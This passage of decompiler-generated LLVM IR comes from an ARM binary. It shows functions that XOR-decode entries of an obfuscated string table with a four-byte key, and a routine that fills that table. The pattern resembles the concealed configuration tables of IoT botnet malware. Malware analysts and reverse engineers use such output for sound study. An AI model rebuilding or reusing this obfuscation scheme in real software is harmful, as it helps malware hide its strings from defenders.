  uselistorder i8 61, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7, 10, 11, 12, 13 }
  uselistorder i32 (i32)* @function_fca0, { 26, 39, 38, 25, 32, 37, 36, 35, 34, 33, 31, 30, 29, 28, 27, 24, 2, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_101d8, { 1, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32*)* @function_fc7c, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10, 33, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36 }
  uselistorder i32 (i32)* @function_fd40, { 22, 21, 30, 29, 28, 27, 26, 25, 24, 23, 20, 3, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1128c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_10904, { 1, 0 }
  uselistorder i32 284, { 3, 0, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @function_e304, { 2, 1, 0 }
  uselistorder i32 254, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i8 5, { 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 39, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_112c4, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_11338, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_c898, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 4873, { 1, 0 }
  uselistorder i32* @global_var_1e734.180, { 1, 0 }
  uselistorder i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32 2) to i16*), { 1, 0 }
  uselistorder i32 (i32, i32)* @function_c848, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* bitcast (i32* @global_var_1e726.177 to i16*), { 1, 0, 2 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 10, 15, 16, 13, 14, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 184, { 1, 0 }
  uselistorder i32 185, { 1, 0 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 62, { 2, 1, 0 }
  uselistorder i32 126, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_15fcc.169 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32, i32)* @function_e3cc, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), { 0, 8, 1, 9, 2, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 ptrtoint (i32* @global_var_15f70.147 to i32), { 1, 2, 0, 3 }
  uselistorder i8* @global_var_1e73d.144, { 1, 0 }
  uselistorder i16 5888, { 1, 0, 2, 3 }
  uselistorder i32 5888, { 2, 0, 3, 1 }
  uselistorder i8 6, { 2, 3, 4, 0, 1 }
  uselistorder i8 16, { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i16* @global_var_1e730.138, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16* @global_var_1e730.138 to i32), { 5, 2, 1, 0, 4, 3 }
  uselistorder i8* @global_var_1e73c.139, { 1, 0 }
  uselistorder i32 10240, { 1, 0, 2 }
  uselistorder i8** @global_var_1e71c.135, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1e71c.135 to i32), { 2, 10, 3, 1, 0, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1023, { 2, 0, 1 }
  uselistorder i32 ()* @function_e094, { 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 3, 5, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_11378, { 10, 9, 8, 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 2048, { 5, 4, 1, 2, 3, 6, 0, 7, 8, 9 }
  uselistorder i32* @global_var_207a0.133, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_2079c.131, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 288, { 0, 1, 6, 2, 3, 4, 5, 7 }
  uselistorder i32* @global_var_1e74c.119, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder i32 (i32*)* @function_10860, { 0, 1, 2, 3, 4, 5, 8, 6, 7 }
  uselistorder i32 (i32)* @function_e0f0, { 1, 0 }
  uselistorder i32* @global_var_20780.45, { 3, 4, 1, 2, 0, 5, 6, 7, 8, 9, 10, 14, 11, 12, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_20780.45 to i32), { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @function_103dc, { 2, 1, 0 }
  uselistorder i32 ()* @function_108d0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fbd8, { 1, 0 }
  uselistorder label %dec_label_pc_fbd0, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_fbc4, { 1, 0 }
  uselistorder label %dec_label_pc_ef14.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ef14.backedge.thread561, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_ef14.backedge.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9b4, { 1, 0 }
  uselistorder label %dec_label_pc_f914, { 1, 2, 3, 0, 4, 6, 7, 5 }
  uselistorder label %dec_label_pc_f8dc, { 1, 0 }
  uselistorder label %dec_label_pc_f8c8, { 1, 2, 3, 4, 0, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f8b8, { 1, 0 }
  uselistorder label %dec_label_pc_f7a8, { 1, 0 }
  uselistorder label %dec_label_pc_f728, { 5, 3, 4, 2, 6, 1, 0 }
  uselistorder label %dec_label_pc_f6f4, { 1, 0 }
  uselistorder label %thread-pre-split124, { 1, 0 }
  uselistorder label %dec_label_pc_f6a4, { 1, 0 }
  uselistorder label %dec_label_pc_f5e8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f5d0, { 1, 0 }
  uselistorder label %dec_label_pc_f49c, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f484, { 1, 0 }
  uselistorder label %dec_label_pc_f3c8, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f3b0, { 1, 0 }
  uselistorder label %dec_label_pc_f33c, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %.thread103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f308, { 1, 0 }
  uselistorder label %.thread99, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_f2d4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f290, { 1, 0 }
  uselistorder label %dec_label_pc_f290.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f224, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f20c, { 1, 0 }
  uselistorder label %dec_label_pc_f150, { 1, 0, 2, 3, 4, 5, 7, 8, 9, 6 }
  uselistorder label %dec_label_pc_f138, { 1, 0 }
  uselistorder label %dec_label_pc_f018, { 1, 6, 7, 3, 0, 2, 4, 5 }
  uselistorder label %bb424, { 1, 0 }
  uselistorder label %bb422, { 1, 0 }
  uselistorder label %dec_label_pc_efe0, { 1, 0 }
  uselistorder label %dec_label_pc_ef78, { 1, 0 }
  uselistorder label %.thread82, { 1, 0 }
  uselistorder label %dec_label_pc_ef2c, { 1, 0 }
  uselistorder label %dec_label_pc_ef1c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ef1c.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_eef8, { 1, 0 }
  uselistorder label %bb418, { 1, 0 }
  uselistorder label %dec_label_pc_ee1c, { 1, 0 }
  uselistorder label %bb416, { 1, 0 }
  uselistorder label %bb414, { 1, 0 }
  uselistorder label %bb412, { 1, 0 }
  uselistorder label %bb410, { 3, 4, 0, 1, 2, 6, 5 }
  uselistorder label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ecec.dec_label_pc_ecec_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_ece0, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_ecc8, { 1, 0 }
  uselistorder label %dec_label_pc_eca4, { 1, 0 }
  uselistorder label %dec_label_pc_eb58, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_eb44, { 1, 0 }
  uselistorder label %bb407, { 1, 0 }
  uselistorder label %dec_label_pc_e9d8, { 1, 0 }
  uselistorder label %dec_label_pc_e9cc, { 1, 0 }
  uselistorder label %dec_label_pc_e9c0, { 1, 0 }
  uselistorder label %dec_label_pc_e9b4, { 1, 0 }
  uselistorder label %dec_label_pc_e9a8, { 1, 0 }
  uselistorder label %dec_label_pc_e994, { 1, 0 }
  uselistorder label %dec_label_pc_e980, { 1, 0 }
  uselistorder label %dec_label_pc_e96c, { 1, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e928, { 1, 0 }
  uselistorder label %dec_label_pc_e91c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e8f8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e8d4, { 1, 0 }
  uselistorder label %bb374, { 1, 0 }
  uselistorder label %dec_label_pc_e880, { 30, 6, 10, 2, 11, 3, 12, 4, 13, 5, 14, 0, 15, 16, 17, 18, 7, 8, 9, 19, 20, 21, 22, 23, 24, 25, 26, 27, 1, 28, 29, 31 }
  uselistorder label %dec_label_pc_e670, { 1, 0 }
}

define i32 @function_fc7c(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_fc7c:
  store i32 ptrtoint (i32* @global_var_207ac.195 to i32), i32* @r2, align 4
  %v3_fc80 = mul i32 %arg1, 8
  %v2_fc84 = add i32 %v3_fc80, ptrtoint (i32* @global_var_207ac.195 to i32)
  store i32 %v2_fc84, i32* @r3, align 4
  %v2_fc88 = icmp eq i32* %arg2, null
  br i1 %v2_fc88, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_fc7c
  %v3_fc904 = inttoptr i32 %v2_fc84 to i32*
  %v4_fc905 = load i32, i32* %v3_fc904, align 4
  br label %bb7

bb:                                               ; preds = %dec_label_pc_fc7c
  %v2_fc8c = add i32 %v3_fc80, add (i32 ptrtoint (i32* @global_var_207ac.195 to i32), i32 4)
  %v3_fc8c = inttoptr i32 %v2_fc8c to i16*
  %v4_fc8c = load i16, i16* %v3_fc8c, align 4
  %v5_fc8c = zext i16 %v4_fc8c to i32
  store i32 %v5_fc8c, i32* @r3, align 4
  %v3_fc90 = inttoptr i32 %v2_fc84 to i32*
  %v4_fc90 = load i32, i32* %v3_fc90, align 4
  store i32 %v5_fc8c, i32* %arg2, align 4
  br label %bb7

bb7:                                              ; preds = %.thread, %bb
  %v4_fc906 = phi i32 [ %v4_fc905, %.thread ], [ %v4_fc90, %bb ]
  ret i32 %v4_fc906

; uselistorder directives
  uselistorder i32 %v2_fc84, { 1, 0, 2 }
  uselistorder i32 %v3_fc80, { 1, 0 }
  uselistorder label %bb7, { 1, 0 }
}

define i32 @function_fca0(i32 %arg1) local_unnamed_addr {
dec_label_pc_fca0:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fca8 = mul i32 %arg1, 8
  %v2_fcac = add i32 %v3_fca8, ptrtoint (i32* @global_var_207ac.195 to i32)
  %v2_fcb0 = load i32, i32* inttoptr (i32 124220 to i32*), align 4
  %v1_fcb4 = add i32 %v3_fca8, add (i32 ptrtoint (i32* @global_var_207ac.195 to i32), i32 4)
  %v2_fcb4 = inttoptr i32 %v1_fcb4 to i16*
  %v3_fcb4 = load i16, i16* %v2_fcb4, align 4
  %v3_fcb8 = udiv i32 %v2_fcb0, 256
  %v2_fcbc = icmp eq i16 %v3_fcb4, 0
  %v3_fcc0 = udiv i32 %v2_fcb0, 65536
  store i32 %v3_fcc0, i32* @r3, align 4
  %v3_fcc4 = load i32, i32* @r4, align 4
  store i32 %v3_fcc4, i32* %stack_var_-16, align 4
  %v1_fcc8 = urem i32 %v3_fcb8, 256
  store i32 %v1_fcc8, i32* %r6.global-to-local, align 4
  %v1_fccc = urem i32 %v3_fcc0, 256
  store i32 %v1_fccc, i32* %r5.global-to-local, align 4
  %v3_fcd0 = udiv i32 %v2_fcb0, 16777216
  store i32 %v3_fcd0, i32* %r4.global-to-local, align 4
  %v1_fcd4 = urem i32 %v2_fcb0, 256
  store i32 %v1_fcd4, i32* %lr.global-to-local, align 4
  br i1 %v2_fcbc, label %dec_label_pc_fd30, label %dec_label_pc_fcdc

dec_label_pc_fcdc:                                ; preds = %dec_label_pc_fca0
  store i32 0, i32* @ip, align 4
  %v1_fce0 = inttoptr i32 %v2_fcac to i32*
  br label %dec_label_pc_fce0

dec_label_pc_fce0:                                ; preds = %dec_label_pc_fce0.dec_label_pc_fce0_crit_edge, %dec_label_pc_fcdc
  %v0_fce8 = phi i32 [ %v0_fce8.pre, %dec_label_pc_fce0.dec_label_pc_fce0_crit_edge ], [ %v1_fcd4, %dec_label_pc_fcdc ]
  %v2_fcec = phi i32 [ %v1_fd24, %dec_label_pc_fce0.dec_label_pc_fce0_crit_edge ], [ 0, %dec_label_pc_fcdc ]
  %v2_fce0 = load i32, i32* %v1_fce0, align 4
  %v2_fce4 = add i32 %v2_fce0, %v2_fcec
  %v3_fce4 = inttoptr i32 %v2_fce4 to i8*
  %v4_fce4 = load i8, i8* %v3_fce4, align 1
  %v6_fce4 = zext i8 %v4_fce4 to i32
  %v2_fce8 = xor i32 %v6_fce4, %v0_fce8
  %v1_fcec = trunc i32 %v2_fce8 to i8
  store i8 %v1_fcec, i8* %v3_fce4, align 1
  %v2_fcf0 = load i32, i32* %v1_fce0, align 4
  %v0_fcf4 = load i32, i32* @ip, align 4
  %v2_fcf4 = add i32 %v0_fcf4, %v2_fcf0
  %v3_fcf4 = inttoptr i32 %v2_fcf4 to i8*
  %v4_fcf4 = load i8, i8* %v3_fcf4, align 1
  %v6_fcf4 = zext i8 %v4_fcf4 to i32
  %v0_fcf8 = load i32, i32* %r6.global-to-local, align 4
  %v2_fcf8 = xor i32 %v0_fcf8, %v6_fcf4
  %v1_fcfc = trunc i32 %v2_fcf8 to i8
  store i8 %v1_fcfc, i8* %v3_fcf4, align 1
  %v2_fd00 = load i32, i32* %v1_fce0, align 4
  %v0_fd04 = load i32, i32* @ip, align 4
  %v2_fd04 = add i32 %v0_fd04, %v2_fd00
  %v3_fd04 = inttoptr i32 %v2_fd04 to i8*
  %v4_fd04 = load i8, i8* %v3_fd04, align 1
  %v6_fd04 = zext i8 %v4_fd04 to i32
  %v0_fd08 = load i32, i32* %r5.global-to-local, align 4
  %v2_fd08 = xor i32 %v0_fd08, %v6_fd04
  %v1_fd0c = trunc i32 %v2_fd08 to i8
  store i8 %v1_fd0c, i8* %v3_fd04, align 1
  %v2_fd10 = load i32, i32* %v1_fce0, align 4
  %v0_fd14 = load i32, i32* @ip, align 4
  %v2_fd14 = add i32 %v0_fd14, %v2_fd10
  %v3_fd14 = inttoptr i32 %v2_fd14 to i8*
  %v4_fd14 = load i8, i8* %v3_fd14, align 1
  %v6_fd14 = zext i8 %v4_fd14 to i32
  %v0_fd18 = load i32, i32* %r4.global-to-local, align 4
  %v2_fd18 = xor i32 %v0_fd18, %v6_fd14
  store i32 %v2_fd18, i32* @r3, align 4
  %v1_fd1c = trunc i32 %v2_fd18 to i8
  store i8 %v1_fd1c, i8* %v3_fd14, align 1
  %v3_fd20 = load i16, i16* %v2_fcb4, align 4
  %v4_fd20 = zext i16 %v3_fd20 to i32
  %v0_fd24 = load i32, i32* @ip, align 4
  %v1_fd24 = add i32 %v0_fd24, 1
  store i32 %v1_fd24, i32* @ip, align 4
  %v8_fd2c = icmp sgt i32 %v4_fd20, %v1_fd24
  br i1 %v8_fd2c, label %dec_label_pc_fce0.dec_label_pc_fce0_crit_edge, label %dec_label_pc_fd30.loopexit

dec_label_pc_fce0.dec_label_pc_fce0_crit_edge:    ; preds = %dec_label_pc_fce0
  %v0_fce8.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fce0

dec_label_pc_fd30.loopexit:                       ; preds = %dec_label_pc_fce0
  %v2_fd30.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fd30

dec_label_pc_fd30:                                ; preds = %dec_label_pc_fd30.loopexit, %dec_label_pc_fca0
  %v2_fd30 = phi i32 [ %v2_fd30.pre, %dec_label_pc_fd30.loopexit ], [ %v3_fcc4, %dec_label_pc_fca0 ]
  store i32 %v2_fd30, i32* @r4, align 4
  ret i32 %v2_fcac

; uselistorder directives
  uselistorder i32 %v1_fd24, { 1, 2, 0 }
  uselistorder i32 %v1_fcd4, { 1, 0 }
  uselistorder i32 %v3_fcc0, { 1, 0 }
  uselistorder i32 %v2_fcb0, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fca8, { 1, 0 }
}

define i32 @function_fd40(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd40:
  %lr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fd48 = mul i32 %arg1, 8
  %v2_fd4c = add i32 %v3_fd48, ptrtoint (i32* @global_var_207ac.195 to i32)
  %v2_fd50 = load i32, i32* inttoptr (i32 124220 to i32*), align 4
  %v1_fd54 = add i32 %v3_fd48, add (i32 ptrtoint (i32* @global_var_207ac.195 to i32), i32 4)
  %v2_fd54 = inttoptr i32 %v1_fd54 to i16*
  %v3_fd54 = load i16, i16* %v2_fd54, align 4
  %v3_fd58 = udiv i32 %v2_fd50, 256
  %v2_fd5c = icmp eq i16 %v3_fd54, 0
  %v3_fd60 = udiv i32 %v2_fd50, 65536
  %v3_fd64 = load i32, i32* @r4, align 4
  store i32 %v3_fd64, i32* %stack_var_-16, align 4
  %v1_fd68 = urem i32 %v3_fd58, 256
  store i32 %v1_fd68, i32* %r6.global-to-local, align 4
  %v1_fd6c = urem i32 %v3_fd60, 256
  store i32 %v1_fd6c, i32* %r5.global-to-local, align 4
  %v3_fd70 = udiv i32 %v2_fd50, 16777216
  store i32 %v3_fd70, i32* %r4.global-to-local, align 4
  %v1_fd74 = urem i32 %v2_fd50, 256
  store i32 %v1_fd74, i32* %lr.global-to-local, align 4
  br i1 %v2_fd5c, label %dec_label_pc_fdd0, label %dec_label_pc_fd7c

dec_label_pc_fd7c:                                ; preds = %dec_label_pc_fd40
  store i32 0, i32* @ip, align 4
  %v1_fd80 = inttoptr i32 %v2_fd4c to i32*
  br label %dec_label_pc_fd80

dec_label_pc_fd80:                                ; preds = %dec_label_pc_fd80.dec_label_pc_fd80_crit_edge, %dec_label_pc_fd7c
  %v0_fd88 = phi i32 [ %v0_fd88.pre, %dec_label_pc_fd80.dec_label_pc_fd80_crit_edge ], [ %v1_fd74, %dec_label_pc_fd7c ]
  %v2_fd8c = phi i32 [ %v1_fdc4, %dec_label_pc_fd80.dec_label_pc_fd80_crit_edge ], [ 0, %dec_label_pc_fd7c ]
  %v2_fd80 = load i32, i32* %v1_fd80, align 4
  %v2_fd84 = add i32 %v2_fd80, %v2_fd8c
  %v3_fd84 = inttoptr i32 %v2_fd84 to i8*
  %v4_fd84 = load i8, i8* %v3_fd84, align 1
  %v6_fd84 = zext i8 %v4_fd84 to i32
  %v2_fd88 = xor i32 %v6_fd84, %v0_fd88
  %v1_fd8c = trunc i32 %v2_fd88 to i8
  store i8 %v1_fd8c, i8* %v3_fd84, align 1
  %v2_fd90 = load i32, i32* %v1_fd80, align 4
  %v0_fd94 = load i32, i32* @ip, align 4
  %v2_fd94 = add i32 %v0_fd94, %v2_fd90
  %v3_fd94 = inttoptr i32 %v2_fd94 to i8*
  %v4_fd94 = load i8, i8* %v3_fd94, align 1
  %v6_fd94 = zext i8 %v4_fd94 to i32
  %v0_fd98 = load i32, i32* %r6.global-to-local, align 4
  %v2_fd98 = xor i32 %v0_fd98, %v6_fd94
  %v1_fd9c = trunc i32 %v2_fd98 to i8
  store i8 %v1_fd9c, i8* %v3_fd94, align 1
  %v2_fda0 = load i32, i32* %v1_fd80, align 4
  %v0_fda4 = load i32, i32* @ip, align 4
  %v2_fda4 = add i32 %v0_fda4, %v2_fda0
  %v3_fda4 = inttoptr i32 %v2_fda4 to i8*
  %v4_fda4 = load i8, i8* %v3_fda4, align 1
  %v6_fda4 = zext i8 %v4_fda4 to i32
  %v0_fda8 = load i32, i32* %r5.global-to-local, align 4
  %v2_fda8 = xor i32 %v0_fda8, %v6_fda4
  %v1_fdac = trunc i32 %v2_fda8 to i8
  store i8 %v1_fdac, i8* %v3_fda4, align 1
  %v2_fdb0 = load i32, i32* %v1_fd80, align 4
  %v0_fdb4 = load i32, i32* @ip, align 4
  %v2_fdb4 = add i32 %v0_fdb4, %v2_fdb0
  %v3_fdb4 = inttoptr i32 %v2_fdb4 to i8*
  %v4_fdb4 = load i8, i8* %v3_fdb4, align 1
  %v6_fdb4 = zext i8 %v4_fdb4 to i32
  %v0_fdb8 = load i32, i32* %r4.global-to-local, align 4
  %v2_fdb8 = xor i32 %v0_fdb8, %v6_fdb4
  %v1_fdbc = trunc i32 %v2_fdb8 to i8
  store i8 %v1_fdbc, i8* %v3_fdb4, align 1
  %v3_fdc0 = load i16, i16* %v2_fd54, align 4
  %v4_fdc0 = zext i16 %v3_fdc0 to i32
  %v0_fdc4 = load i32, i32* @ip, align 4
  %v1_fdc4 = add i32 %v0_fdc4, 1
  store i32 %v1_fdc4, i32* @ip, align 4
  %v8_fdcc = icmp sgt i32 %v4_fdc0, %v1_fdc4
  br i1 %v8_fdcc, label %dec_label_pc_fd80.dec_label_pc_fd80_crit_edge, label %dec_label_pc_fdd0.loopexit

dec_label_pc_fd80.dec_label_pc_fd80_crit_edge:    ; preds = %dec_label_pc_fd80
  %v0_fd88.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_fd80

dec_label_pc_fdd0.loopexit:                       ; preds = %dec_label_pc_fd80
  %v2_fdd0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fdd0.loopexit, %dec_label_pc_fd40
  %v2_fdd0 = phi i32 [ %v2_fdd0.pre, %dec_label_pc_fdd0.loopexit ], [ %v3_fd64, %dec_label_pc_fd40 ]
  store i32 %v2_fdd0, i32* @r4, align 4
  ret i32 %v2_fd4c

; uselistorder directives
  uselistorder i32 %v1_fdc4, { 1, 2, 0 }
  uselistorder i32 %v1_fd74, { 1, 0 }
  uselistorder i32 %v2_fd50, { 3, 0, 1, 2 }
  uselistorder i32 %v2_fd4c, { 1, 0 }
  uselistorder i32 %v3_fd48, { 1, 0 }
}

define i32 @function_fde0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_fde0:
  %stack_var_-32 = alloca i32, align 4
  %v3_fde0 = load i32, i32* @r4, align 4
  store i32 %v3_fde0, i32* %stack_var_-32, align 4
  %v6_fde0 = load i32, i32* @r5, align 4
  %v9_fde0 = load i32, i32* @r6, align 4
  %v12_fde0 = load i32, i32* @r7, align 4
  %v15_fde0 = load i32, i32* @r8, align 4
  %v18_fde0 = load i32, i32* @sb, align 4
  %v21_fde0 = load i32, i32* @sl, align 4
  %v1_fde8 = call i32 @function_11604(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_207ac.195 to i32), i32* @r4, align 4
  store i32 %v1_fde8, i32* @r6, align 4
  %v4_fe00 = call i32 @function_10190(i32 %v1_fde8, i32 ptrtoint ([3 x i8]* @global_var_16004.202 to i32), i32 2)
  %v0_fe04 = load i32, i32* @r5, align 4
  %v0_fe08 = load i32, i32* @r6, align 4
  store i32 %v0_fe08, i32* @global_var_207b4.203, align 4
  %v1_fe0c = trunc i32 %v0_fe04 to i16
  store i16 %v1_fe0c, i16* bitcast (i32* @global_var_207b8.204 to i16*), align 4
  %v1_fe10 = call i32 @function_11604(i32 %v0_fe04)
  %v0_fe14 = load i32, i32* @r5, align 4
  store i32 %v1_fe10, i32* @r6, align 4
  %v3_fe20 = call i32 @function_10190(i32 %v1_fe10, i32 ptrtoint (i32* @global_var_16008.206 to i32), i32 %v0_fe14)
  %v0_fe28 = load i32, i32* @r6, align 4
  store i32 %v0_fe28, i32* @global_var_207bc.207, align 4
  %v0_fe2c = load i32, i32* @r5, align 4
  %v1_fe2c = trunc i32 %v0_fe2c to i16
  store i16 %v1_fe2c, i16* bitcast (i32* @global_var_207c0.208 to i16*), align 4
  %v1_fe30 = call i32 @function_11604(i32 29)
  store i32 %v1_fe30, i32* @r5, align 4
  %v3_fe40 = call i32 @function_10190(i32 %v1_fe30, i32 ptrtoint (i32* @global_var_160ec.210 to i32), i32 29)
  store i16 29, i16* bitcast (i32* @global_var_207c8.211 to i16*), align 4
  %v0_fe50 = load i32, i32* @r5, align 4
  store i32 %v0_fe50, i32* @global_var_207c4.212, align 4
  %v1_fe54 = call i32 @function_11604(i32 7)
  store i32 %v1_fe54, i32* @r5, align 4
  store i32 7, i32* @r7, align 4
  %v4_fe68 = call i32 @function_10190(i32 %v1_fe54, i32 ptrtoint ([8 x i8]* @global_var_1600c.214 to i32), i32 7)
  %v0_fe70 = load i32, i32* @r5, align 4
  store i32 %v0_fe70, i32* @global_var_20814.215, align 4
  %v0_fe74 = load i32, i32* @r7, align 4
  %v1_fe74 = trunc i32 %v0_fe74 to i16
  store i16 %v1_fe74, i16* bitcast (i32* @global_var_20818.216 to i16*), align 4
  %v1_fe78 = call i32 @function_11604(i32 5)
  store i32 %v1_fe78, i32* @r5, align 4
  store i32 5, i32* @sb, align 4
  %v4_fe8c = call i32 @function_10190(i32 %v1_fe78, i32 ptrtoint ([6 x i8]* @global_var_16014.218 to i32), i32 5)
  %v0_fe94 = load i32, i32* @r5, align 4
  store i32 %v0_fe94, i32* @global_var_2081c.219, align 4
  %v0_fe98 = load i32, i32* @sb, align 4
  %v1_fe98 = trunc i32 %v0_fe98 to i16
  store i16 %v1_fe98, i16* bitcast (i32* @global_var_20820.220 to i16*), align 4
  %v1_fe9c = call i32 @function_11604(i32 4)
  store i32 %v1_fe9c, i32* @r5, align 4
  %v4_feac = call i32 @function_10190(i32 %v1_fe9c, i32 ptrtoint ([5 x i8]* @global_var_1601c.222 to i32), i32 4)
  store i16 4, i16* bitcast (i32* @global_var_20828.223 to i16*), align 4
  %v0_febc = load i32, i32* @r5, align 4
  store i32 %v0_febc, i32* @global_var_20824.224, align 4
  %v1_fec0 = call i32 @function_11604(i32 6)
  store i32 %v1_fec0, i32* @r5, align 4
  store i32 6, i32* @sl, align 4
  %v4_fed4 = call i32 @function_10190(i32 %v1_fec0, i32 ptrtoint ([7 x i8]* @global_var_16024.226 to i32), i32 6)
  %v0_fedc = load i32, i32* @r5, align 4
  store i32 %v0_fedc, i32* @global_var_2082c.227, align 4
  %v0_fee0 = load i32, i32* @sl, align 4
  %v1_fee0 = trunc i32 %v0_fee0 to i16
  store i16 %v1_fee0, i16* bitcast (i32* @global_var_20830.228 to i16*), align 4
  %v1_fee4 = call i32 @function_11604(i32 14)
  store i32 %v1_fee4, i32* @r5, align 4
  store i32 14, i32* @r8, align 4
  %v4_fef8 = call i32 @function_10190(i32 %v1_fee4, i32 ptrtoint ([15 x i8]* @global_var_1602c.230 to i32), i32 14)
  %v0_ff00 = load i32, i32* @r5, align 4
  store i32 %v0_ff00, i32* @global_var_20834.231, align 4
  %v0_ff04 = load i32, i32* @r8, align 4
  %v1_ff04 = trunc i32 %v0_ff04 to i16
  store i16 %v1_ff04, i16* bitcast (i32* @global_var_20838.232 to i16*), align 4
  %v1_ff08 = call i32 @function_11604(i32 8)
  store i32 8, i32* @r6, align 4
  store i32 %v1_ff08, i32* @r5, align 4
